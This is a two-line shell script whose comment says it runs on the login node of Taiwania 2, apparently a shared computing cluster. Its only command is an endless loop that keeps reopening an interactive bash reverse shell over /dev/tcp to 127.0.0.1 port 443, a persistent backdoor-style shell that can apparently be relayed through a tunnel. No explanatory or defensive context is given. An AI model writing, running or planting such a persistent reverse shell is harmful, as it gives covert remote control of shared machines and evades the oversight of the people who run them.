# This client runs on login node of Taiwania 2

while true; do bash -i >& /dev/tcp/127.0.0.1/443 0>&1; done
